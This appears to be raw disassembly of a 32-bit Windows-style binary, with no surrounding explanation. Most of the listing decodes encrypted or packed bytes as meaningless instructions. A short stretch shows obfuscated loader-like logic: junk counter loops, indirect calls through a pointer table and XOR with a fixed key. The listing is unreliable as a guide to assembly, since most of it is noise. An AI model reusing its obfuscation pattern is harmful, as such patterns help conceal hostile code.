  40c52a:	fsubr  DWORD PTR [edi-0x3f]
  40c52d:	push   ebp
  40c52e:	repz call 0xcb641f2a
  40c534:	in     al,0xd6
  40c536:	dec    edi
  40c537:	rcr    DWORD PTR [eax],0x15
  40c53a:	or     dl,BYTE PTR [edx+0x67]
  40c53d:	add    cl,BYTE PTR [ecx+0x6d77dcad]
  40c543:	or     DWORD PTR [ebx],0xafffb35b
  40c549:	cmp    BYTE PTR [ebp-0x30],al
  40c54c:	retf   
  40c54d:	push   ebp
  40c54e:	imul   BYTE PTR [ecx]
  40c550:	or     esi,esp
  40c552:	fist   WORD PTR [edx+edi*1+0x2a]
  40c556:	mov    cl,0x78
  40c558:	lods   eax,DWORD PTR ds:[esi]
  40c559:	cmp    ebp,DWORD PTR [edx+edx*1-0x5e]
  40c55d:	mov    ebp,0x1ae42415
  40c562:	xor    eax,0x7510855
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	mov    bh,al
  40c57a:	or     bl,ah
  40c57c:	jno    0x40c505
  40c57e:	jo     0x40c5f0
  40c580:	jb     0x40c601
  40c582:	jo     0x40c5f4
  40c584:	(bad)  
  40c585:	and    eax,0xad88c2fc
  40c58a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c58b:	inc    eax
  40c58c:	xchg   esi,eax
  40c58d:	push   eax
  40c58e:	popf   
  40c58f:	xor    DWORD PTR [ecx],eax
  40c591:	je     0x40c54d
  40c593:	xchg   esp,eax
  40c594:	or     ebx,DWORD PTR [ebx-0x6d]
  40c597:	aad    0x89
  40c599:	xchg   BYTE PTR [esi-0x30],bl
  40c59c:	aas    
  40c59d:	inc    edi
  40c59e:	adc    al,0xbb
  40c5a0:	mov    ds:0x95e19c1f,al
  40c5a5:	dec    esp
  40c5a6:	mov    ecx,0xd1393000
  40c5ab:	and    BYTE PTR [edi+eax*8+0x3f],bh
  40c5af:	push   esi
  40c5b0:	retf   0xe4ec
  40c5b3:	fidivr WORD PTR ds:[ebx+ecx*4-0x9]
  40c5b8:	push   eax
  40c5b9:	add    eax,0xfb9f4aa2
  40c5be:	pop    esp
  40c5bf:	xchg   DWORD PTR [ebx+edi*1],esp
  40c5c2:	mov    bh,BYTE PTR ds:0x156bd49f
  40c5c8:	nop
  40c5c9:	arpl   WORD PTR [ecx-0x3c],si
  40c5cc:	ror    DWORD PTR [ecx+0x30],0x16
  40c5d0:	sbb    al,0x4
  40c5d2:	add    bh,BYTE PTR [eax]
  40c5d4:	adc    BYTE PTR [ebx],dl
  40c5d6:	(bad)
  40c5db:	arpl   WORD PTR [eax],bx
  40c5dd:	rol    al,0xb6
  40c5e0:	sub    edi,eax
  40c5e2:	(bad)  
  40c5e3:	mov    ebx,0xfd38aa9d
  40c5e8:	jmp    0xef89:0xb631e170
  40c5ef:	mov    eax,ds:0xf6115e5b
  40c5f4:	sub    DWORD PTR [eax],ebx
  40c5f6:	inc    ebx
  40c5f7:	lods   al,BYTE PTR ds:[esi]
  40c5f8:	sahf   
  40c5f9:	xor    DWORD PTR [edx-0x26],0xffffff8c
  40c5fd:	sbb    esi,esp
  40c5ff:	repnz add DWORD PTR [esi+ebx*1],esp
  40c603:	popf   
  40c604:	je     0x40c65d
  40c606:	test   BYTE PTR [ebp+0xf228654],cl
  40c60c:	dec    edi
  40c60d:	in     al,0xf9
  40c60f:	dec    eax
  40c610:	mov    ecx,0xb56cd24e
  40c615:	clc    
  40c616:	or     ecx,ebx
  40c618:	popa   
  40c619:	stc    
  40c61a:	inc    esp
  40c61b:	mov    al,ds:0xb4356b0f
  40c620:	xor    bl,BYTE PTR [esi+0x52]
  40c623:	xor    al,0xcb
  40c625:	lock out 0x61,al
  40c628:	(bad)  
  40c629:	out    0x58,eax
  40c62b:	xchg   ebx,eax
  40c62c:	bound  bp,DWORD PTR [esp+ebp*4+0x4]
  40c631:	ja     0x40c5b9
  40c633:	xor    al,0xdd
  40c635:	push   cs
  40c636:	loop   0x40c5ec
  40c638:	ret    0xd16c
  40c63b:	mov    ah,0xfb
  40c63d:	xchg   esp,eax
  40c63e:	sar    esp,0xb8
  40c641:	ja     0x40c637
  40c643:	imul   esi,DWORD PTR [edi+0x44],0xffffffc4
  40c647:	adc    ebx,DWORD PTR [eax]
  40c649:	jl     0x40c65c
  40c64b:	mov    ch,0xd
  40c64d:	jl     0x40c6c5
  40c64f:	addr16 inc ebx
  40c651:	add    al,0x8a
  40c653:	fucomp st(7)
  40c655:	ins    BYTE PTR es:[edi],dx
  40c656:	pop    ebx
  40c657:	popf   
  40c658:	xchg   BYTE PTR [edx+edx*4-0x52],bh
  40c65c:	call   0x5ef0818
  40c661:	int    0x36
  40c663:	and    dh,bh
  40c665:	and    BYTE PTR [edx],dh
  40c667:	sub    DWORD PTR [edi],ecx
  40c669:	dec    edx
  40c66a:	and    DWORD PTR [ecx],edi
  40c66c:	(bad)  
  40c66d:	jmp    0x736e072e
  40c672:	int    0xd2
  40c674:	in     eax,dx
  40c675:	rcl    ebp,0xa
  40c678:	mov    ecx,0xce81dbca
  40c67d:	xor    DWORD PTR [ebx],eax
  40c67f:	push   cs
  40c680:	jg     0x40c6ee
  40c682:	cmp    al,0x52
  40c684:	(bad)  
  40c685:	push   edx
  40c686:	mov    bh,0xa
  40c688:	or     DWORD PTR [ecx-0x79626249],ebx
  40c68e:	or     dh,BYTE PTR [ebp+0x60]
  40c691:	sub    BYTE PTR ds:0xba92f2b1,0xab
  40c698:	sbb    bh,dl
  40c69a:	mov    esp,0xd59b6409
  40c69f:	jns    0x40c702
  40c6a1:	cmp    eax,0x872c84ec
  40c6a6:	inc    ebx
  40c6a7:	scas   eax,DWORD PTR es:[edi]
  40c6a8:	or     BYTE PTR [eax+0x49],al
  40c6ab:	xchg   edi,eax
  40c6ac:	add    eax,0xe5d08517
  40c6b1:	mov    al,ds:0x4e05931e
  40c6b6:	push   edi
  40c6b7:	adc    esp,DWORD PTR [edx+0x47666adb]
  40c6bd:	nop
  40c6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6bf:	stc    
  40c6c0:	leave  
  40c6c1:	adc    ebp,DWORD PTR [esi+edi*2-0x252bfc6e]
  40c6c8:	adc    cl,ch
  40c6ca:	adc    al,0x56
  40c6cc:	out    0xc5,al
  40c6ce:	push   eax
  40c6cf:	data16 sahf 
  40c6d1:	push   edi
  40c6d2:	sbb    BYTE PTR [edi],cl
  40c6d4:	sub    ebx,0x805e8ff9
  40c6da:	stos   DWORD PTR es:[edi],eax
  40c6db:	out    dx,al
  40c6dc:	sbb    cl,BYTE PTR [eax]
  40c6de:	mov    edi,0x880eb238
  40c6e3:	cdq    
  40c6e4:	popa   
  40c6e5:	pop    ss
  40c6e6:	dec    edx
  40c6e7:	mov    edi,0xe77ba045
  40c6ec:	(bad)  
  40c6ee:	aaa    
  40c6ef:	and    eax,0x1899e6f7
  40c6f4:	lods   eax,DWORD PTR ds:[esi]
  40c6f5:	mov    eax,0x13648a04
  40c6fa:	sub    eax,0x96fd8e53
  40c6ff:	stos   DWORD PTR es:[edi],eax
  40c700:	push   0x55
  40c702:	(bad)  
  40c703:	pop    esp
  40c704:	hlt    
  40c705:	or     dh,ah
  40c707:	sub    al,0x4
  40c709:	repz rol DWORD PTR [edx-0x12],cl
  40c70d:	ins    DWORD PTR es:[edi],dx
  40c70e:	(bad)  
  40c70f:	jge    0x40c6fc
  40c711:	into   
  40c712:	ror    DWORD PTR [ecx+eiz*8-0x25437d1e],0xf4
  40c71a:	out    dx,al
  40c71b:	sub    eax,0x2c1f0e64
  40c720:	mov    ebx,0x1be84476
  40c725:	shl    BYTE PTR [edx-0x1781394f],cl
  40c72b:	leave  
  40c72c:	xor    bl,dl
  40c72e:	daa    
  40c72f:	inc    edx
  40c730:	loopne 0x40c781
  40c732:	dec    edx
  40c733:	jnp    0x40c715
  40c735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c736:	ins    WORD PTR es:[edi],dx
  40c738:	call   0x5d00:0xecfa9c0a
  40c73f:	(bad)  
  40c740:	jl     0x40c763
  40c742:	cmp    edx,DWORD PTR [eax]
  40c744:	push   cs
  40c745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c746:	int3   
  40c747:	mov    BYTE PTR [eax-0x7f],dh
  40c74a:	loop   0x40c701
  40c74c:	cmp    al,ah
  40c74e:	aam    0x74
  40c750:	jge    0x40c758
  40c752:	pop    edx
  40c753:	mov    bl,0x7c
  40c755:	or     al,0x1c
  40c757:	xchg   ecx,eax
  40c758:	inc    bh
  40c75a:	test   BYTE PTR [ebp+0x33a37c8d],dl
  40c760:	jbe    0x40c73b
  40c762:	(bad)  
  40c763:	and    BYTE PTR [edi-0x7e],ah
  40c766:	stc    
  40c767:	fist   WORD PTR cs:[esi]
  40c76a:	sub    DWORD PTR ds:0xb5b9141e,0x5e9ed88
  40c774:	iret   
  40c775:	cmp    al,0x9
  40c777:	nop
  40c778:	in     al,dx
  40c779:	ins    BYTE PTR es:[edi],dx
  40c77a:	or     DWORD PTR [esi+0x41],esi
  40c77d:	add    dh,dh
  40c77f:	and    BYTE PTR [edi+0x729c0577],cl
  40c785:	xor    al,BYTE PTR [eax]
  40c787:	leave  
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434372,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432700,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432700
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432700,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432700,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432700,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432dc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432d1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434386,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434386
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434386,ecx
  40c805:	cmp    DWORD PTR ds:0x434386,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434386,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43441d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4329ea
  40c82d:	cmp    DWORD PTR ds:0x434386,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434386
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434386,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4343a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4343a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4343a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432c66
  40c87c:	cmp    DWORD PTR ds:0x4343a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4343a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4343a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4343a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4343a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	sar    DWORD PTR [ebx+0x73fa1e58],0x85
  40c8e0:	jo     0x40c952
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c915
  40c8e7:	pop    edi
  40c8e8:	and    DWORD PTR [edi-0x4d],eax
  40c8eb:	neg    BYTE PTR [ebx]
  40c8ed:	pop    ss
  40c8ee:	out    dx,al
  40c8ef:	mov    ebx,0x9298ddf7
  40c8f4:	dec    esi
  40c8f5:	es out 0x40,eax
  40c8f8:	pop    edx
  40c8f9:	shl    DWORD PTR [edx],0x9a
  40c8fc:	sbb    esi,esi
  40c8fe:	lods   eax,DWORD PTR ds:[esi]
  40c8ff:	adc    al,ch
  40c901:	jle    0x40c93c
  40c903:	fimul  DWORD PTR ds:0x850ccf40
  40c909:	dec    ecx
  40c90a:	cs push 0xffffff94
  40c90d:	jae    0x40c91c
  40c90f:	pop    esi
  40c910:	stos   BYTE PTR es:[edi],al
  40c911:	enter  0xbcf5,0xf9
  40c915:	pushw  0xffa0
  40c918:	pop    ebp
  40c919:	(bad)  
  40c91a:	mov    al,0x9a
  40c91c:	sbb    eax,DWORD PTR [eax]
  40c91e:	or     eax,DWORD PTR [ecx+0x68]
  40c921:	neg    ah
  40c923:	xchg   edi,eax
  40c924:	sti    
  40c925:	and    DWORD PTR [edi+ebx*4],edi
  40c928:	jle    0x40c92c
  40c92a:	inc    esp
  40c92b:	sub    DWORD PTR [edi-0x40],ebx
  40c92e:	(bad)  
  40c92f:	dec    esi
  40c930:	fcom   DWORD PTR [edi]
  40c932:	push   ds
  40c933:	test   DWORD PTR [edi+0x3],esp
  40c936:	cdq    
  40c937:	fadd   st(6),st
  40c939:	sahf   
  40c93a:	push   ss
  40c93b:	test   DWORD PTR [esi+0x6d],ebp
  40c93e:	dec    eax
  40c93f:	mov    edi,0x591dcf3f
  40c944:	dec    esp
  40c945:	pushf  
  40c946:	jle    0x40c9ad
  40c948:	pop    edi
  40c949:	cli    
  40c94a:	xlat   BYTE PTR ds:[ebx]
  40c94b:	dec    eax
  40c94c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c94d:	xchg   ebx,eax
  40c94e:	retf   
  40c94f:	mov    bl,0xb7
  40c951:	xchg   esp,eax
  40c952:	in     al,0x9f
  40c954:	add    eax,0xfcc3d5ff
  40c959:	test   DWORD PTR [ecx-0x31],ecx
  40c95c:	inc    ebx
  40c95d:	call   0x11e0d964
  40c962:	shr    eax,0x79
  40c965:	push   edx
  40c966:	push   0x9d992bc3
  40c96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c96c:	fld    TBYTE PTR [edx+0x16]
  40c96f:	and    cl,BYTE PTR [esi]
  40c971:	(bad)
  40c975:	mov    WORD PTR [edi],ss
  40c977:	arpl   WORD PTR [ebp+edx*2+0x75],sp
  40c97b:	pop    es
  40c97c:	pop    edx
  40c97d:	cli    
  40c97e:	ja     0x40c9d0
  40c980:	sub    BYTE PTR [edx+0x2958857a],0x8f
  40c987:	inc    ebp
  40c988:	std    
  40c989:	loopne 0x40c96e
  40c98b:	fnstsw WORD PTR [ebp+0x7b79a4b2]
  40c991:	xchg   ebx,eax
  40c992:	arpl   WORD PTR [edx+ebx*4+0x101fc5df],di
  40c999:	xchg   esi,eax
  40c99a:	aad    0x92
  40c99c:	out    0xdc,al
  40c99e:	or     esi,ecx
  40c9a0:	dec    esp
  40c9a1:	dec    ebx
  40c9a2:	out    0x3a,al
  40c9a4:	lods   al,BYTE PTR ds:[esi]
  40c9a5:	scas   eax,DWORD PTR es:[edi]
  40c9a6:	mov    al,dl
  40c9a8:	dec    esp
  40c9a9:	or     al,0xd7
  40c9ab:	adc    BYTE PTR [esi-0x9],al
  40c9ae:	sbb    eax,0x45b6b651
  40c9b3:	imul   ebp,DWORD PTR [edx+esi*8+0x168c3da1],0x7d0e1921
  40c9be:	pop    ds
  40c9bf:	jecxz  0x40ca1d
  40c9c1:	fwait
  40c9c2:	cld    
  40c9c3:	leave  
  40c9c4:	jg     0x40c999
  40c9c6:	(bad)  
  40c9c7:	and    BYTE PTR gs:[ebx-0x12],ch
  40c9cb:	sub    dh,BYTE PTR [edx+0x56]
  40c9ce:	dec    edx
  40c9cf:	popf   
  40c9d0:	test   DWORD PTR [ebx-0x79b31008],esi
  40c9d6:	sub    BYTE PTR [esi-0x62],ch
  40c9d9:	sbb    al,0x92
  40c9db:	retf   
  40c9dc:	aam    0xaa
  40c9de:	and    BYTE PTR [esi],dh
  40c9e0:	add    al,0xc8
  40c9e2:	loopne 0x40c9d2
  40c9e4:	(bad)  
  40c9e5:	(bad)  
  40c9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e8:	enterw 0xc4d7,0x3d
  40c9ed:	sub    ch,BYTE PTR [esi+0x2a]
  40c9f0:	xor    DWORD PTR [esi+eiz*2+0x7510cc55],ecx
  40c9f7:	hlt    
  40c9f8:	sub    eax,ebp
  40c9fa:	mov    al,0x1b
  40c9fc:	retf   
  40c9fd:	nop
  40c9fe:	ret    
  40c9ff:	xor    ebx,DWORD PTR [eax-0x2a]
  40ca02:	imul   DWORD PTR [ebx+0x7b72de66]
  40ca08:	and    al,0x5d
  40ca0a:	retf   0x31a9
  40ca0d:	push   eax
  40ca0e:	sbb    eax,0xaaa38dad
  40ca13:	and    al,0xf8
  40ca15:	xchg   DWORD PTR [edi-0x1648a54c],edx
  40ca1b:	pop    ebp
  40ca1c:	outs   dx,DWORD PTR ds:[esi]
  40ca1d:	lods   eax,DWORD PTR ds:[esi]
  40ca1e:	call   0x319e:0xee5bf58d
  40ca25:	fwait
  40ca26:	mov    al,ds:0xc967206a
  40ca2b:	inc    ebx
  40ca2c:	mov    dh,dh
  40ca2e:	pop    ebp
  40ca2f:	repnz (bad) 
  40ca31:	cli    
  40ca32:	mov    ah,0xaa
  40ca34:	adc    al,0x1a
  40ca36:	enter  0x977b,0x72
  40ca3a:	add    al,0x47
  40ca3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3d:	add    ebx,eax
  40ca3f:	cmp    al,0x16
  40ca41:	sbb    BYTE PTR [ebp-0x21],cl
  40ca44:	sbb    DWORD PTR [eax],ebx
  40ca46:	mov    WORD PTR [eax],cs
  40ca48:	push   eax
  40ca49:	push   esi
  40ca4a:	add    eax,0x85b1f82c
  40ca4f:	out    dx,eax
  40ca50:	sbb    BYTE PTR [eax],0xe3
  40ca53:	nop
  40ca54:	aas    
  40ca55:	fmul   QWORD PTR [esi]
  40ca57:	inc    ecx
  40ca58:	cmp    cl,BYTE PTR [ebx-0x26]
  40ca5b:	rcl    al,1
  40ca5d:	cwde   
  40ca5e:	push   0xffffffa1
  40ca60:	(bad)
  40ca63:	push   eax
  40ca64:	jbe    0x40cab0
  40ca66:	ficomp DWORD PTR [esi+0x2a]
  40ca69:	adc    al,0x76
  40ca6b:	sub    eax,0xf58ad8f8
  40ca70:	test   edx,0x50b57a94
  40ca76:	xchg   ebp,eax
  40ca77:	add    cl,BYTE PTR [eax]
  40ca79:	test   BYTE PTR [edi],al
  40ca7b:	sbb    DWORD PTR [edi+0x5593a8d9],0x9e771b67
  40ca85:	xor    eax,0xcc214ff7
  40ca8a:	xchg   edx,eax
  40ca8b:	pop    esp
  40ca8c:	mov    ch,0x11
  40ca8e:	pop    edx
  40ca8f:	mov    dh,BYTE PTR [ebp+0x6f]
  40ca92:	jbe    0x40cacb
  40ca94:	or     cl,BYTE PTR [ebx-0x62295b46]
  40ca9a:	mov    ch,ch
  40ca9c:	mov    ebx,0x487e6e02
  40caa1:	(bad)  
  40caa3:	add    ecx,DWORD PTR [edx+0x4b6ebcb0]
  40caa9:	and    ecx,eax
  40caab:	leave  
  40caac:	lods   al,BYTE PTR ds:[esi]
  40caad:	jp     0x40ca33
  40caaf:	push   cs
  40cab0:	sbb    bh,cl
  40cab2:	mov    BYTE PTR [edi+edx*2-0x5931b9ff],ah
  40cab9:	cmp    edx,DWORD PTR [ecx-0x53]
  40cabc:	jb     0x40cac4
  40cabe:	mov    al,ds:0x82116199
  40cac3:	arpl   WORD PTR [ebx+0x3275c517],bx
  40cac9:	jae    0x40cb3e
  40cacb:	fild   QWORD PTR [edx]
  40cacd:	sbb    BYTE PTR [esi-0x5c472711],bl
  40cad3:	or     al,BYTE PTR [ebx]
  40cad5:	mov    ch,0x61
  40cad7:	mov    ebx,0xd0ccfd6e
  40cadc:	stos   DWORD PTR es:[edi],eax
  40cadd:	iret   
  40cade:	enter  0x5e8f,0xbd
  40cae2:	sar    BYTE PTR [edx],0x17
  40cae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cae6:	cmp    edi,DWORD PTR [ecx]
  40cae8:	sub    al,0xb3
  40caea:	(bad)
  40caed:	adc    al,0xfd
  40caef:	cmp    bh,BYTE PTR [ebx]
  40caf1:	lahf   
  40caf2:	cld    
  40caf3:	xor    eax,DWORD PTR [edx+0x6e87a7de]
  40caf9:	fstp   TBYTE PTR [ecx]
  40cafb:	pop    ds
  40cafc:	sub    DWORD PTR [ebp-0x3032c508],0xcf3055f1
  40cb06:	sub    eax,0xd2e99f8
  40cb0b:	addr16 sbb ecx,edx
  40cb0e:	jne    0x40caae
  40cb10:	test   ebx,eax
  40cb12:	push   edx
  40cb13:	fs jbe 0x40cafa
  40cb16:	and    ecx,DWORD PTR [edi]
  40cb18:	daa    
  40cb19:	retf   
  40cb1a:	test   eax,0xcc33b448
  40cb1f:	(bad)  
  40cb20:	jge    0x40cab9
  40cb22:	lds    eax,FWORD PTR [ebx-0x45]
  40cb25:	xchg   esi,eax
  40cb26:	sar    BYTE PTR [eax+esi*8],cl
  40cb29:	stos   BYTE PTR es:[edi],al
  40cb2a:	sbb    al,0xe8
  40cb2c:	pop    ds
  40cb2d:	mov    eax,ds:0xaf790b03
  40cb32:	mov    ds:0x93a5104b,al
  40cb37:	pop    ss
  40cb38:	mov    WORD PTR ds:0x3bb058f3,?
  40cb3e:	(bad)  
  40cb3f:	jne    0x40cb55
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	sub    al,0xe4
  40cb6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb6e:	xchg   ecx,eax
  40cb6f:	int3   
  40cb70:	xor    BYTE PTR [eax+0x70],0xc9
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb6f
  40cb78:	lods   eax,DWORD PTR ds:[esi]
  40cb79:	push   eax
  40cb7a:	inc    ebx
  40cb7b:	lods   eax,DWORD PTR ds:[esi]
  40cb7c:	jg     0x40cbc9
  40cb7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb7f:	and    DWORD PTR [ebx+eiz*1-0x1d],ecx
  40cb83:	lods   eax,DWORD PTR ds:[esi]
  40cb84:	pop    ebp
  40cb85:	mov    edi,0x2d13fcbf
  40cb8a:	test   BYTE PTR [esi+ecx*2],dh
  40cb8d:	adc    ebx,edi
  40cb8f:	out    dx,al
  40cb90:	ss push edx
  40cb92:	ja     0x40cb62
  40cb94:	test   al,0xf6
  40cb96:	xchg   ebx,eax
  40cb97:	ret    0x5a14
  40cb9a:	pop    esp
  40cb9b:	call   0x454b:0x612d529f
  40cba2:	xchg   esi,eax
  40cba3:	mov    bh,0xcc
  40cba5:	aam    0x7
  40cba7:	jno    0x40cb88
  40cba9:	retw   
  40cbab:	cli    
  40cbac:	jno    0x40cb8f
  40cbae:	out    dx,eax
  40cbaf:	retf   0x9aa1
  40cbb2:	and    edx,edx
  40cbb4:	aam    0x53
  40cbb6:	popa   
  40cbb7:	nop/reserved BYTE PTR [ebp-0x44fbb03f]
  40cbbe:	dec    ecx
  40cbbf:	sbb    DWORD PTR [eax+0x2ca2d1d9],ebp
  40cbc5:	cmp    eax,0x1aa41ae
  40cbca:	loop   0x40cbec
  40cbcc:	pop    edx
  40cbcd:	inc    edx
  40cbce:	mov    eax,0xde7690d6
  40cbd3:	pusha  
  40cbd4:	push   ebp
  40cbd5:	mov    ds:0x4e1b47b9,al
  40cbda:	push   ebp
  40cbdb:	ins    DWORD PTR es:[edi],dx
  40cbdc:	and    eax,0xdc14420
  40cbe1:	call   0x963a4ed7
  40cbe6:	cmp    esi,DWORD PTR [edi+0x4b]
  40cbe9:	mov    al,ds:0xda4cb2fb
  40cbee:	into   
  40cbef:	add    DWORD PTR [eax-0x71048992],esp
  40cbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbf6:	and    esp,eax
  40cbf8:	mov    ch,0xf9
  40cbfa:	imul   eax,DWORD PTR [edx],0x64f9ca37
  40cc00:	sar    BYTE PTR [ecx+eiz*2],cl
  40cc03:	mov    esi,0xdfe8e0de
  40cc08:	dec    eax
  40cc09:	lahf   
  40cc0a:	clc    
  40cc0b:	or     ebx,DWORD PTR ds:0x4094e05d
  40cc11:	enter  0x3c29,0xc5
  40cc15:	retf   
  40cc16:	pop    ds
  40cc17:	and    al,0xae
  40cc19:	jnp    0x40cbd7
  40cc1b:	ja     0x40cc3f
  40cc1d:	xlat   BYTE PTR ds:[ebx]
  40cc1e:	ror    DWORD PTR cs:[esi-0x17],0x91
  40cc23:	aad    0xba
  40cc25:	cmp    DWORD PTR [ebx],eax
  40cc27:	mov    DWORD PTR ds:0x477bc08f,ebx
  40cc2d:	adc    DWORD PTR es:[ebp-0x55],edx
  40cc31:	das    
  40cc32:	mov    BYTE PTR [ecx],dl
  40cc34:	(bad)  
  40cc36:	outs   dx,DWORD PTR ds:[esi]
  40cc37:	xchg   BYTE PTR [edx],bl
  40cc39:	icebp  
  40cc3a:	xor    eax,0xb2edf3ff
  40cc3f:	mov    edx,cs
  40cc41:	xlat   BYTE PTR ds:[ebx]
  40cc42:	rcl    DWORD PTR [ebp-0x4741da28],cl
  40cc48:	and    eax,0xe4cf9734
  40cc4d:	dec    DWORD PTR [edi-0x6e]
  40cc50:	jns    0x40cbe5
  40cc52:	and    BYTE PTR [ebp-0x42a5c187],cl
  40cc58:	sti    
  40cc59:	das    
  40cc5a:	(bad)  
  40cc5b:	adc    eax,0xac8c4f9e
  40cc60:	cdq    
  40cc61:	xchg   BYTE PTR [edx+0x3f],dl
  40cc64:	out    0x15,al
  40cc66:	fwait
  40cc67:	sub    eax,esp
  40cc69:	jno    0x40cc51
  40cc6b:	xchg   ecx,esi
  40cc6d:	pushf  
  40cc6e:	daa    
  40cc6f:	gs xchg ecx,eax
  40cc71:	inc    esi
  40cc72:	les    esp,FWORD PTR [ecx]
  40cc74:	out    dx,eax
  40cc75:	jno    0x40ccd5
  40cc77:	imul   ebx,DWORD PTR [esi-0x472021ec],0x39fc182b
  40cc81:	sub    eax,0x15efb27b
  40cc86:	inc    edx
  40cc87:	xchg   DWORD PTR [eax+0x29],ebp
  40cc8a:	call   0x24d407f
  40cc8f:	lock mov DWORD PTR [eax],ebx
  40cc92:	div    BYTE PTR [eax+0x1a]
  40cc95:	xor    DWORD PTR [ecx],edi
  40cc97:	repnz or al,0x6c
  40cc9a:	adc    esi,DWORD PTR [ebp+esi*4-0x9e25e4e]
  40cca1:	jecxz  0x40cc91
  40cca3:	loop   0x40cd09
  40cca5:	xchg   esi,eax
  40cca6:	pushf  
  40cca7:	je     0x40cd1c
  40cca9:	xchg   ecx,eax
  40ccaa:	clc    
  40ccab:	sub    al,ch
  40ccad:	inc    ebx
  40ccae:	sbb    esp,ebx
  40ccb0:	jmp    0xd3da:0x8fd25444
  40ccb7:	iret   
  40ccb8:	sub    eax,0x77decb63
  40ccbd:	jno    0x40ccfe
  40ccbf:	repz or BYTE PTR [eax],ah
  40ccc2:	call   DWORD PTR [ebp+edi*1+0x6d]
  40ccc6:	test   bl,bh
  40ccc8:	dec    edx
  40ccc9:	int    0xc2
  40cccb:	jg     0x40ccd0
  40cccd:	sar    BYTE PTR [edx+ebp*2],0xf4
  40ccd1:	out    0xa,eax
  40ccd3:	fidiv  DWORD PTR [ebp+0x60181d5b]
  40ccd9:	int3   
  40ccda:	mov    ecx,eax
  40ccdc:	pop    esp
  40ccdd:	jge    0x40ccc9
  40ccdf:	push   edi
  40cce0:	xor    edi,DWORD PTR [ebx]
  40cce2:	mov    edx,0x5aa5cbdb
  40cce7:	pop    eax
  40cce8:	pusha  
  40cce9:	jecxz  0x40cc95
  40cceb:	mov    ebx,0xca184ae2
  40ccf0:	xor    al,0xfd
  40ccf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccf3:	aas    
  40ccf4:	mov    gs,esp
  40ccf6:	das    
  40ccf7:	dec    ebx
  40ccf8:	ins    BYTE PTR es:[edi],dx
